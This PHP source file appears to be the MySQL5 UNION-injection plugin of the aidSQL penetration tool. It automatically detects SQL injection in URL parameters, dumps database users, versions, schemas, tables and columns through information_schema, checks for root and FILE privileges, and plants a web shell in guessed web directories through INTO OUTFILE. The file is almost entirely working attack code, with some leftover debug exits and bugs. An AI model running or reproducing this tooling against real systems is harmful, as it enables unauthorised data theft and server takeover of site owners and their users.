<?php

	namespace aidSQL\plugin\sqli {

		class MySQL5 extends InjectionPlugin {

			const		PLUGIN_NAME						= "UNION";
			const		PLUGIN_AUTHOR					= "Juan Stange";

			private	$_affectedDatabases			=	array("mysql");
			private	$_strRepeat						=	100;
			private	$_repeatCharacter				=	"a";
			private	$_fields							=	array();
			private	$_vulnerableIndex				=	0;
			private	$_fieldWrapping				=	NULL;
			private	$_groupConcatLength			=	NULL;


			public function injectionUnionWithConcat(){

				$queryBuilder	=	new \aidSQL\db\MySQLQueryBuilder();
				$this->setQueryBuilder($queryBuilder);

				$parser	=	new \aidSQL\parser\Generic();

				$openTag				=	"<aidsql>";
				$closeTag			=	"</aidsql>";

				$hexOpen				=	\String::hexEncode($openTag);
				$hexClose			=	\String::hexEncode($closeTag);

				$parser->setOpenTag($openTag);
				$parser->setCloseTag($closeTag);
				$parser->setLog($this->_logger);

				$this->setParser($parser);

				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;

				if(!$offset){

					throw(new \Exception("Start offset should be an integer greater than 0!"));

				}

				$sqliParams	=	array(
					"space-char"		=>	" ",
					"field-payloads"	=>	explode('_',$this->_config["field-payloads"]),
					"ending-payloads"	=>	array(
						"comment"=>explode('_',$this->_config["comment-payloads"]),
						"order"=>array(
//							array("by"=>"1","sort"=>"DESC"),
//							array("by"=>"1","sort"=>"ASC"),
							array()
						),
						"limit"=>array(
							array()
	//						array("0","1"),
	//						array("1","1"),
						)
					)
				);


				if(array_key_exists("start-offset",$this->_config)){

					$offset	=	((int)$this->_config["start-offset"])	?	$this->_config["start-offset"]	:	1;

				}

				$this->detectUnionInjection($sqliParams,"unionQuery","CONCAT($hexOpen,%value%,$hexClose)",$offset);

				if(sizeof($this->_injection)){

					return TRUE;

				}

				return FALSE;

			}

			private function wrap($wrapping,$value){

				return preg_replace("/%value%/",$value,$wrapping);

			}

			private function wrapArray(Array $wrapMe,$wrapping){

				$return	=	array();

				foreach($wrapMe as $key=>$wrapIt){

					$return[]	=	$this->wrap($wrapping,$wrapIt);

				}

				return $return;

			}

			private function checkUnionInjectionParameters(Array &$sqliParams){

				if(!isset($sqliParams["field-payloads"])||!is_array($sqliParams["field-payloads"])){
					throw(new \Exception("Invalid field payloads!"));
				}

				if(!isset($sqliParams["ending-payloads"])||!is_array($sqliParams["ending-payloads"])){

					throw(new \Exception("Invalid ending payloads!"));

					if(!isset($sqliParams["comment"])||!is_array($sqliParams["comment"])){

						throw(new \Exception("Comment payloads key inside the ending-payloads array should be an array!"));

					}elseif(!isset($sqliParams["order"])){

						$sqliParams["order"]	=	array();

					}elseif(!isset($sqliParams["limit"])){

						$sqliParams["limit"]	=	array();

					}

				}

			}

			private function makeImpossibleValue($value){

				if(is_numeric($value)){
					return '9e99';
				}

				return md5(rand()*time());

			}


			private function detectUnionInjection(Array $sqliParams,$callback=NULL,$wrapping=NULL,$offset=1,$value=NULL){

				$this->checkUnionInjectionParameters($sqliParams);

				$requestVariables	=	$this->_httpAdapter->getUrl()->getQueryAsArray();

				$mod_rewrite		=	FALSE;

				if(!sizeof($requestVariables)){

					$requestVariables	=	$this->_httpAdapter->getUrl()->getPathAsArray();
					$mod_rewrite		=	TRUE;
					$this->log("Detected no URL variables in URL, assuming mod_rewritten path",0,"light_cyan");

				}

				foreach($requestVariables as $requestVariable=>$requestVariableValue){

					if($this->isIgnoredRequestVariable($requestVariable,$requestVariableValue)){
						continue;
					}

					if($mod_rewrite){

						$requestVariable	=	$requestVariableValue;

						if(is_numeric($requestVariable)){
							$requestVariable	=	(int)$requestVariable;
						}

					}

					$iterationContainer	=	array();

					if($offset>1){

						for($i=0;$i<$offset;$i++){
							$iterationContainer[]	=	$i;
						}

					}

					$fieldPayloadsSize	=	sizeof($sqliParams["field-payloads"]);
					$commentsSize			=	sizeof($sqliParams["ending-payloads"]["comment"]);
					$orderSize				=	sizeof($sqliParams["ending-payloads"]["order"]);

					if(!$orderSize){
						$orderSize	=	1;
					}

					$limitSize				=	sizeof($sqliParams["ending-payloads"]["limit"]);

					if(!$limitSize){
						$limitSize	=	1;
					}

					$totalSize		=	($this->_injectionAttempts*$fieldPayloadsSize*$commentsSize*$orderSize*$limitSize)+1;
					$totalSize		-=	$offset;
					$attemptCount	=	1;

					for($maxFields=$offset;$maxFields<=$this->_injectionAttempts;$maxFields++){

						$iterationContainer[]	=	(!empty($value))	?	$value	:	$maxFields;
	
						$progressMsg	=	$requestVariable.'['.$maxFields."]\t";

						progressBar($attemptCount++,$totalSize,$progressMsg);

						foreach($sqliParams["field-payloads"] as $payLoad){

							$progressMsg = $requestVariable.'['.$maxFields."]\t".(empty($payLoad) ? "\" \"" : $payLoad);

							progressBar($attemptCount++,$totalSize,$progressMsg);

							foreach($sqliParams["ending-payloads"]["comment"] as $comment) {

								$progressMsg = $requestVariable.'['.$maxFields."]\t".
								(empty($payLoad) ? "\" \"" : $payLoad).' + '.
								(empty($comment) ? "\" \"" : $comment);

								progressBar($attemptCount++,$totalSize,$progressMsg);

								foreach($sqliParams["ending-payloads"]["order"] as $order){

									if(sizeof($order)){

										$progressMsg.=" + ".implode($order);
										progressBar($attemptCount++,$totalSize,$progressMsg);

									}

									foreach($sqliParams["ending-payloads"]["limit"] as $limit){

										if(sizeof($limit)){

											$progressMsg.="+ ".implode($limit);
											progressBar($attemptCount++,$totalSize,$progressMsg);

										}

										if(!empty($wrapping)){
											$values	=	$this->wrapArray($iterationContainer,$wrapping);
										}else{
											$values	=	$iterationContainer;
										}

										$this->_queryBuilder->setCommentOpen($comment);
										$this->_queryBuilder->union($values,"ALL");

										if(sizeof($order)){

											$this->_queryBuilder->orderBy($order["by"],$order["sort"]);

										}

										if(sizeof($limit)){

											$this->_queryBuilder->limit($limit);

										}

										$space			=	$this->_queryBuilder->getSpaceCharacter();

										$madeUpValue	=	$this->makeImpossibleValue($requestVariableValue);

										$sql				=	$madeUpValue.$payLoad.
																$space.$this->_queryBuilder->getSQL().$comment;

										$this->_queryBuilder->setSQL($sql);

										$result	=	$this->query($requestVariable,$callback,$mod_rewrite);

										if($result){ //Found SQL UNION Injection

											foreach($requestVariables as $key=>$rV){
												if($key == $requestVariable){
													unset($requestVariables[$key]);
												}
											}

											$injectionParameters	=	array(
																				"index"						=>	$maxFields,	
																				"fieldValues"				=>	$iterationContainer,
																				"requestVariable"			=>	$requestVariable,
																				"requestValue"				=>	$madeUpValue,
																				"requestVariables"		=> $requestVariables,
																				"wrapping"					=>	$wrapping,
																				"payload"					=>	$payLoad,		//constant
																				"limit"						=>	$limit,			//variable 
																				"order"						=>	$order,			//variable
																				"comment"					=>	$comment,		//constant
																				"callback"					=>	$callback,
																				"affectedQueryField"		=> $result[0],
																				"mod_rewrite"				=>	$mod_rewrite
											);

											$this->setInjectionParameters($injectionParameters);

											$this->_payload	=	$payLoad;

											return TRUE;

										}	//if($result)

									}	//limit

								}	//order

							}	//comment

						}	//field-payload


					}	//maxfields

				}	//requestVariables

				return FALSE;

			}

			/**
			*This method creates the injection string it uses $this->_injection parameters in order
			*to make the injection string. 
			*/

			private function buildUnionInjection($value,$from=NULL,Array $where=array(),Array $group=array()){

				$params	=	$this->_injection;

				foreach($params["fieldValues"] as $key=>&$val){

					//FIX ME
					if($val==$this->_injection["affectedQueryField"]){

						$val	=	$this->wrap($params["wrapping"],$value);	

					}

				}

				$this->_queryBuilder->union($params["fieldValues"],"ALL");

				if(!is_null($from)){
					$this->_queryBuilder->from($from);
				}

				if(sizeof($where)){
					$this->_queryBuilder->where($where);
				}

				if(sizeof($group)){
					$this->_queryBuilder->group($group);
				}

				if(isset($params["order"]["by"])){
					$this->_queryBuilder->orderBy($params["order"]["by"],$params["order"]["sort"]);
				}

				if(isset($params["limit"])){
					if(is_array($params["limit"])&&sizeof($params["limit"])){
						$this->_queryBuilder->limit($params["limit"]);
					}
				}

			}

			/**
			*This method creates the injection string through the buildUnionInjection method and executes the query
			*/

			public function unionQuery($value,$from=NULL,Array $where=array(),Array $group=array()){
				
				$this->buildUnionInjection($value,$from,$where,$group);

				$params	=	$this->_injection;
				$sql		=	$this->_queryBuilder->getSQL();
				$sql		=	$params["requestValue"].$params["payload"].$this->_queryBuilder->getSpaceCharacter().$sql.$params["comment"];
				$this->_queryBuilder->setSQL($sql);
				return parent::query($params["requestVariable"],__FUNCTION__,$this->_injection["mod_rewrite"]);

			}

			public function getAffectedDatabases(){
				return $this->_affectedDatabases;
			}


			private function detectTruncatedData($string=NULL){

				if(strlen($string) == $this->_groupConcatLength){

					$this->log("Warning! Detected possibly truncated data!",2,"yellow");
					return TRUE;

				}

				return FALSE;
			
			}

			//GROUP_CONCAT is very efficient when you want to have a small footprint, however
			//some databases can be pretty massive, and the default length of characters brough by GROUP_CONCAT is 1024
			//in MySQL, in this way we make sure that the retrieved data has not been truncated. 
			//If it is we can take other action in order to get what we need.

			private function getGroupConcatLength(){

				if(!is_null($this->_groupConcatLength)){
					return $this->_groupConcatLength;
				}

				$this->log("Checking for @@group_concat_max_len",0,"light_cyan");

				$callback	=	$this->_injection["callback"];
				$length		=	$this->$callback("@@group_concat_max_len");

				$this->_groupConcatLength = $length[0];

				return $this->_groupConcatLength;

			}

			public function count($value,$from=NULL,Array $where=array(),Array $group=array(),$count=NULL){

				return $this->unionQuery("COUNT($value)",$from,$where,$group);
					
			}

			//Suppose you have detected truncated data, well, bad luck.
			//Hopefully we can count the registers and do a limit iteration	
			//through that :)

			public function unionQueryIterateLimit($value,$from=NULL,Array $where=array(),Array $group=array(),$count=NULL){

				if(is_null($count)){

					$count	=	$this->unionQuery("COUNT($value)",$from,$where,$group);
					$count	=	$count[0];
					$this->log("GOT REGISTRY COUNT = $count",0,"light_cyan");

				}

				if(isset($this->_injection["limit"])){
					$restoreLimit	=	$this->_injection["limit"];
				}

				$results			=	array();

				for($i=0;$i<=$count;$i++){


					$this->_injection["limit"]	=	array($i,1);
					$result			=	$this->unionQuery($value,$from,$where,$group);	
					$results[$i]	=	$result[0];

					progressBar($i+1,$count,__FUNCTION__ . '['.substr($results[$i],0,strpos($results[$i],'|')).']');

				}

				if(isset($this->_injection["limit"])&&isset($restoreLimit)){
					$this->_injection["limit"]	=	$restoreLimit;
				}

				return $results;

			}


			public function getSchemas(){

				if($this->_config["all"]["wanted-schemas"]=="none"){
					return FALSE;
				}

				$groupConcatLength	=	$this->getGroupConcatLength();

				$from						=	"information_schema.tables";
				$currentDatabase		=	$this->unionQuery("DATABASE()");
				$currentDatabase		=	$currentDatabase[0];

				if(!$currentDatabase){

					$this->log("WARNING: COULDNT GET CURRENT DATABASE",2,"yellow");

					if($this->_config["all"]["wanted-schemas"]=="{current}"){

						$this->log("ERROR: You have chosen to fetch *ONLY* the current database schema, however aidSQL cannot determine the schema in use, try using --wanted-schemas=\"{all}\" next time",1,"light_red");
						return FALSE;

					}

				}

				switch($this->_config["all"]["wanted-schemas"]){

					case "{current}":

						$injection	=	NULL;
						$databases	=	$currentDatabase;
						break;

					case "{all}":

						$injection	=	"GROUP_CONCAT(DISTINCT(TABLE_SCHEMA))";

						//Here we use group concat in order to see if the injection can be achieved 
						//with little or no effort

						$databases				=	$this->unionQuery($injection,$from);
						$databases				=	$databases[0];

						break;

					default:

						$from			=	"GROUP_CONCAT(information_schema.tables)";
						$where		=	array("TABLE_SCHEMA","IN(",$this->_config["all"]["wanted-schemas"].')');

						//Here we use group concat in order to see if the injection can be achieved 
						//with little or no effort

						$databases				=	$this->unionQuery($injection,$from,$where);
						$databases				=	$databases[0];

						break;

				}


				//However if we detect that the data we fetched is truncated, we are forced 
				//to perform a few 10ths or 100ths of more queries :(

				if(!$injection&&$this->detectTruncatedData($databases)){

					$databases	=	$this->unionQueryIterateLimit($injection,$from);

				}else{

					$databases	=	explode(',',$databases);

				}

				$version					=	$this->getVersion();
				$version					=	$version[0];
				$user						=	$this->getUser();
				$user						=	$user[0];

				if(isset($this->_config["all"]["ommit-schemas"]) && !empty($this->_config["all"]["ommit-schemas"])){

					$ommitSchemas	=	explode(',',$this->_config["all"]["ommit-schemas"]);

				}

				foreach($databases as $database){

					$this->log("FOUND DATABASE $database",0,"light_purple");


					if(isset($ommitSchemas)){

						if(in_array($database,$ommitSchemas)){
							$this->log("Skipping fetching \"$database\" schema",0,"yellow");
							continue;
						}

					}

					$dbSchema	=	$this->getSingleSchema($database,$version,$user);

					if(!$dbSchema){

						$this->log("WARNING: Couldnt fetch database schema!",2,"yellow");

					}

					$this->addSchema($dbSchema);


				}

			}

			public function getSingleSchema($database,$version,$user){

				$groupConcatLength	=	$this->getGroupConcatLength();

				$dbSchema				=	new \aidSQL\core\DatabaseSchema();

				$dbSchema->setDbName($database);
				$dbSchema->setDbUser($user);
				$dbSchema->setDbVersion($version);
	
				$select	=	"TABLE_NAME,0x7c,ENGINE,0x7c,TABLE_COLLATION";
				$from		=	"information_schema.tables";

				$where	=	array("table_schema=".\String::hexEncode($database));

				$tables	=	$this->unionQuery("GROUP_CONCAT($select SEPARATOR 0x25)",$from,$where);
				$tables	=	$tables[0];
				
			
				if($this->detectTruncatedData($tables)||!$tables){

					$count	=	$this->unionQuery("COUNT(TABLE_NAME)",$from,$where);	
					$count	=	$count[0]-1;
					//$select	=	substr($select,0,(strlen($separator)*-1));
					$tables	=	$this->unionQueryIterateLimit($select,$from,$where,array(),$count);

				}else{

					$tables	=	explode('%',$tables);

					foreach($tables as $table){

						$test	=	explode('|',$table);

						if(!isset($test[0])||!isset($test[1])||!isset($test[2])){

							$this->log("DETECTED ERRONEOUS TABLE FETCHING WITH GROUP_CONCAT",1,"red");
							$count	=	$this->unionQuery("COUNT(TABLE_NAME)",$from,$where);	
							$count	=	$count[0] - 1;

							$tables	=	$this->unionQueryIterateLimit($select,$from,$where,array(),$count);
							break;

						}

					}


				}

				$retTables	=	array();

				foreach($tables as $table){

					$table						=	explode('|',$table);

					$tableName					=	$table[0];

					$tmpTable					=	array();

					$tmpTable["engine"]		=	$table[1];
					$tmpTable["collation"]	=	$table[2];

					$columns	=	array();

					if($this->_config["all"]["schema"] == "complete"){

						$columns	=	$this->getColumns($tableName,$database);

					}

					$dbSchema->addTable($tableName,$tmpTable,$columns);

					$retTables[]	=	$table;

				}

				return $dbSchema;

			}
			

			public function getColumns($table=NULL,$database=NULL){

				if(is_null($table)){

					throw(new \Exception("ERROR: Table name cannot be empty when trying to fetch columns! (Please report bug)"));
					return array();

				}

				if(is_null($database)){

					throw(new \Exception("ERROR: Database name cannot be empty when trying to fetch columns! (Please report bug)"));
					return array();

				}

				$separator	=	",0x3f";

				$this->log("Fetching table \"$table\" columns ...",0,"white");

				$select							=	"COLUMN_NAME,0x7c,COLUMN_TYPE,0x7c,IF(COLUMN_KEY,COLUMN_KEY,0x6e)".
														",0x7c,IF(EXTRA,EXTRA,0x6e)";

				$from								=	"information_schema.columns";

				$where							=	array(
																	"table_schema=".\String::hexEncode($database),
																	"AND",
																	"table_name=".\String::hexEncode($table)
														);

				$columns		=	$this->unionQuery("GROUP_CONCAT($select SEPARATOR 0x25)",$from,$where);	
				$columns		=	$columns[0];

				$retColumns	=	array();

				if($this->detectTruncatedData($columns)||!$columns){

					$count	=	$this->unionQuery("COUNT(COLUMN_NAME)",$from,$where);	
					$count	=	$count[0];

					//$select	=	substr($select,0,(strlen($separator)*-1));
					$columns =	$this->unionQueryIterateLimit($select,$from,$where,array(),$count);


				}else{

					$columns		=	explode('%',$columns);

					//Check that we dont get any truncated data 

					foreach($columns as $column){

						$test	=	explode('|',$column);

						if(!isset($test[0])||!isset($test[1])||!isset($test[2])||!isset($test[3])){

							$this->log("DETECTED ERRONEOUS COLUMN FETCHING WITH GROUP_CONCAT",1,"red");
							$count	=	$this->unionQuery("COUNT(COLUMN_NAME)",$from,$where);	
							$count	=	$count[0];

							//$select	=	substr($select,0,(strlen($separator)*-1));
							$columns =	$this->unionQueryIterateLimit($select,$from,$where,array(),$count);

							break;

						}

					}
					
				}

				foreach($columns as $column){

					if(empty($column)){
						continue;
					}

					$column							=	explode('|',$column);
					$tmpColName						=	(substr($column[0],0,1)==',')	?	substr($column[0],1)	:	$column[0];
					$tmpCol["type"]				=	$column[1];
					$tmpCol["key"]					=	$column[2];
					$tmpCol["extra"]				=	$column[3];

					$retColumns[$tmpColName]	=	$tmpCol;

				}

				return $retColumns;

			}

			public function getUser(){

				static $user	=	NULL;

				if($user){
					return $user;
				}

				$callback	=	$this->_injection["callback"];
				$this->log("Fetching database user ...",0,"light_green");
				$user			=	$this->$callback("USER()");
				return $user;

			}

			public function getVersion(){

				$callback	=	$this->_injection["callback"];
				return $this->$callback("@@version");
					
			}

			public function getDatadir(){

				$select	= "@@datadir";
				return $this->$callback($select);

			}

			public function isRoot($user=NULL){
			
				if(!$user){
					$user	=	$this->getUser();
					$user	=	$user[0];
				}

				$isRoot	=	substr($user,0,strpos($user,'@'));

				if($isRoot=="root"){
					$this->log("USER RUNNING THIS DATABASE IS ROOT!",0,"light_green");
					return TRUE;
				}

				$this->log("USER IS NOT ROOT, CHECKING FILE PRIV",0,"light_red");
				$checkFilePriv	=	$this->checkPrivilege($user);

				if($checkFilePriv){
					return TRUE;
				}

				return FALSE;
				
			}

			private function checkPrivilege($user,$privilege="FILE"){

				$user			=	explode('@',$user);
				$user			=	\String::hexEncode("'".$user[0]."'@'".$user[1]."'");
				$privilege	=	\String::hexEncode($privilege);
				$select		=	"PRIVILEGE_TYPE";
				$from			=	"information_schema.user_privileges";
				$where		=	array("privilege_type=$privilege","AND","GRANTEE=$user");
				$callback	=	$this->_injection["callback"];
				return $this->$callback($select,$from,$where);

			}


			public function getShell(\aidSQL\core\PluginLoader &$pLoader,\aidSQL\http\crawler &$crawler){

				if($this->_injection["mod_rewrite"]){
					$this->log("Sorry, this kind of shell injection wont work with mod_rewrite",1,"red");
					return FALSE;
				}

				$shellCode	=	&$this->_shellCode;
				$restoreUrl	=	clone($this->_httpAdapter->getUrl());

				if(empty($shellCode)){

					throw (new \Exception("Cant make shell without any shell code, use the shell-code option to set your shell code",1,"red"));

				}

				$this->buildUnionInjection($shellCode);

				$webDefaultsPlugin	=	$pLoader->getPluginInstance("info","defaults",$this->_httpAdapter,$this->_log);
				$information			=	$webDefaultsPlugin->getInfo();

				if (!is_a($information,"\\aidSQL\\plugin\\info\\InfoResult")){
					throw(new \Exception("Plugin $plugin[name] should return an instance of \\aidSQL\\plugin\\info\\InfoResult"));
				}

				$webDirectories	=	$information->getWebDirectories();
				
				foreach($crawler->getFiles() as $file=>$type){
	
					$path	=	dirname($file);

					if($path=='.'){
						continue;
					}

					if(!in_array($path,$webDirectories)){

						$this->log("Adding crawler path information: $path",0,"light_green",TRUE);
						array_unshift($webDirectories,$path);

					}

				}

				array_unshift($webDirectories,'');

				$unixDirectories		=	$information->getUnixDirectories();
				$winDirectories		=	$information->getWindowsDirectories();

				if(!sizeof($webDirectories)){

					$this->log("Web defaults Plugin failed to get a valid directory for injecting a shell :(",2,"red",TRUE);

				}

				$url	=	$this->_httpAdapter->getUrl();
				$host	=	$url->getHost();
				$url	=	$url->getScheme()."://$host";

				$fileName	=	$this->getShellName();

				foreach($webDirectories as $key=>$webDir){

					$webDir	=	trim($webDir,'/').'/';

					foreach($unixDirectories as $unixDir){

						if($this->_injection["mod_rewrite"]){
							$restoreUrl->restorePath();
						}

						$this->_httpAdapter->setUrl($restoreUrl);
	
						$unixDir					=	'/'.trim($unixDir,'/');
						$shellWebLocation		=	$url.'/'.$webDir.$fileName;

						$shellDirLocations	=	array();
						$shellDirLocations[]	=	$unixDir.'/'.$webDir.$fileName;
						$shellDirLocations[]	=	$unixDir.'/'.$host.'/'.$webDir.$fileName;

						if(preg_Match("#www\.#",$host)){
							$shellDirLocations[]	=	$unixDir.'/'.substr($host,strpos($host,'.')+1).'/'.$webDir.$fileName;
						}

						foreach($shellDirLocations as $shellDirLocation){

							$this->log("Trying to inject shell in \"$shellDirLocation\"",0,"light_cyan");

							$this->buildUnionInjection($shellCode);
							$this->_queryBuilder->toOutFile($shellDirLocation);

							$sql	=	$this->_injection["requestValue"]			.
										$this->_injection["payload"]					.
										$this->_queryBuilder->getSpaceCharacter()	.
										$this->_queryBuilder->getSQL()				.
										$this->_injection["comment"];

							$this->_queryBuilder->setSQL($sql);
							parent::query($this->_injection["affectedQueryField"],__FUNCTION__,$this->_injection["mod_rewrite"]);	

							$shellUrl	=	new \aidSQL\core\URL($shellWebLocation);
							$this->_httpAdapter->setUrl($shellUrl);
							$parser		=	parent::getParser();
							$content		=	$this->_httpAdapter->fetch();
							echo $shellUrl."\n";
							echo $content."\n";
							die();
							$gotShell	=	$parser->analyze($content);
							
							if($gotShell){
								$this->_httpAdapter->setUrl($restoreUrl);
								return $shellUrl;
							}

						}	

					}

					$this->_httpAdapter->setUrl($restoreUrl);

				}

				return FALSE;

			}


			public static function getHelp(\aidSQL\core\Logger $logger){

				$logger->log("--sqli-mysql5-injection-attempts\tAt how many attempts shall we stop trying");
				$logger->log("--sqli-mysql5-start-offset\t\t<integer>Start the UNION injection at this offset (if you know what youre doing)");
				$logger->log("--sqli-mysql5-var-count\t\t<integer> Try this amount of variables per link");
				$logger->log("--sqli-numeric-only\t\t\tOnly try to perform injection on integer fields");
				$logger->log("--sqli-mysql5-strings-only\t\tOnly try to perform injection on string fields");
				$logger->log("--sqli-mysql5-field-payloads\t\tSet field payloads delimited by _\ti.e: _'_')_%)");
				$logger->log("--sqli-mysql5-ending-payloads\t\tSet ending payloads delimited by _\ti.e: LIMIT 1,1_ORDER BY 1");
				$logger->log("--sqli-mysql5-comment-payloads\t\tSet comment payloads delimited by _\ti.e: #_/*_--");
				$logger->log("--sqli-mysql5-shell-code\tPut your favorite shell code here i.e ".'<?php var_dump($_SERVER);?>');

			}

		}

	}
?>
